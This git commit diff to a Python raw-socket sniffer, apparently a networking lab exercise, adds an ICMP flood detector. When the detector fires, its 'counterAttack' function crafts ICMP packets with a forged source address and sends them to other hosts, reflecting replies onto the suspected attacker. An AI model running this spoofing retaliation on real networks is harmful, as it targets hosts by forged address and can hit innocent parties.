ed4cff2316ac8ce5bcf2086114bc6a562b7108be
Pedrochem <pedrochem@hotmail.com>
2021-05-12 23:26:16 -0300

    added working code

--- sniffer.py
+++ sniffer.py
@@ -1,15 +1,19 @@
 
 import socket, sys
 import struct
+import queue
+import datetime
 
 ETH_P_ALL = 0x0003
 eth_length = 14
+senders = {}
+ip_host = socket.gethostbyname(socket.gethostname())
 
 def bytes_to_mac(bytesmac):
     return ":".join("{:02x}".format(x) for x in bytesmac)
 
-def process_ip(packet):
-    print("IP Packet")
+def receiveIp(packet):
+    # print("IP Packet")
     ip_header = packet[eth_length:20+eth_length]
     iph = struct.unpack("!BBHHHBBH4s4s", ip_header)
     version_ihl = iph[0]
@@ -20,38 +24,102 @@ def process_ip(packet):
     protocol = iph[6]
     s_addr = socket.inet_ntoa(iph[8])
     d_addr = socket.inet_ntoa(iph[9])
-    print("IP Src: "+s_addr)
-    print("IP Dst: "+d_addr)
-    if protocol == 1:
-        process_icmp(packet, iph_length)
+    # print("IP Src: "+s_addr)
+    # print("IP Dst: "+d_addr)
+
+    # icmp protocol
+    if protocol == 1 and s_addr != ip_host:
+        receiveIcmp(packet, iph_length,s_addr)
 
 
-def process_icmp(packet, iph_length):
+def receiveIcmp(packet, iph_length,s_addr):
     print("ICMP Packet")
     icmp_header = packet[iph_length + eth_length:]
     icmph = struct.unpack("!BBHHH%ds" % (len(icmp_header)-8), icmp_header)
-    icmp_type = icmph[0]
-    icmp_code = icmph[1]
-    icmp_id = icmph[2]
-    icmp_seq = icmph[3]
-    icmp_payload = icmph[4]
-    print("Type: ", icmp_type)
-    print("Code: ", icmp_code)
+    now = datetime.datetime.now()
+
+    if s_addr not in senders:
+        senders[s_addr] = queue.Queue(100)
+
+    elif senders[s_addr].full():
+        print("------------------Enchi---------------------------")
+        timeFirst = senders[s_addr].get()
+        if timeFirst + datetime.timedelta(seconds=1) > now:
+            counterAttack(s_addr)
+
+    senders[s_addr].put(now)
+
+
+def counterAttack(s_addr):
+    for addr in senders:
+        if addr != s_addr:
+            sendIcmp(addr,s_addr)
+
+def sendIcmp(addr,s_addr):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
+    except OSError as msg:
+        print('Error'+str(msg))
+        sys.exit(1)
     
-    if icmp_type == 8 and icmp_code == 0:
-        print("Echo request")
+    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    type = 8
+    code = 0
+    mychecksum = 0
+    identifier = 12345
+    seqnumber = 0
+    payload = b"istoehumteste"
 
-    elif icmp_type == 0 and icmp_code == 0:
-        print("Echo reply")
+    icmp_packet = struct.pack("!BBHHH%ds"%len(payload), type, code, mychecksum, identifier, seqnumber, payload)
+    mychecksum = checksum(icmp_packet)
+    icmp_packet = struct.pack("!BBHHH%ds"%len(payload), type, code, mychecksum, identifier, seqnumber, payload)
+    
+    ip_ver = 4
+    ip_ihl = 5
+    ip_tos = 0
+    ip_tot_len = 0 # automaticamente preenchido - AF_INET
+    ip_id = 54321
+    ip_frag_off = 0
+    ip_ttl = 255
+    ip_proto = socket.IPPROTO_ICMP
+    ip_check = 0  # automaticamente preenchido - AF_INET
+    ip_saddr = socket.inet_aton(s_addr)
+    ip_daddr = socket.inet_aton(addr)
 
-def start():    
+    ip_ihl_ver = (ip_ver << 4) + ip_ihl
+
+    ip_header = struct.pack("!BBHHHBBH4s4s", ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl,
+        ip_proto, ip_check, ip_saddr, ip_daddr)
+
+    dest_ip = addr
+    dest_addr = socket.gethostbyname(dest_ip)
+
+    s.sendto(ip_header+icmp_packet, (dest_addr,0))
+
+
+def checksum(msg):
+    s = 0
+    # add padding if not multiple of 2 (16 bits)
+    msg = (msg + b'\x00') if len(msg)%2 else msg
+    for i in range(0, len(msg), 2):
+        w = msg[i] + (msg[i+1] << 8)
+        s = s + w
+        s = (s & 0xffff) + (s >> 16)
+    s = ~s & 0xffff
+    return socket.ntohs(s)            
+
+
+
+def start():
+    senders = dict()    
     try:
         s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(ETH_P_ALL))
     except OSError as msg:
         print('Error'+str(msg))
         sys.exit(1)
 
-    print('Socket created!')
+    # print('Socket created!')
+
 
     s.bind(('eth0',0))
 
@@ -63,11 +131,11 @@ def start():
 
         eth = struct.unpack("!6s6sH",eth_header)
 
-        print("MAC Dst: "+bytes_to_mac(eth[0]))
-        print("MAC Src: "+bytes_to_mac(eth[1]))
-        print("Type: "+hex(eth[2]))
+        # print("MAC Dst: "+bytes_to_mac(eth[0]))
+        # print("MAC Src: "+bytes_to_mac(eth[1]))
+        # print("Type: "+hex(eth[2]))
 
         if eth[2] == 0x0800 :
-            process_ip(packet)
+            receiveIp(packet)
 
 start()
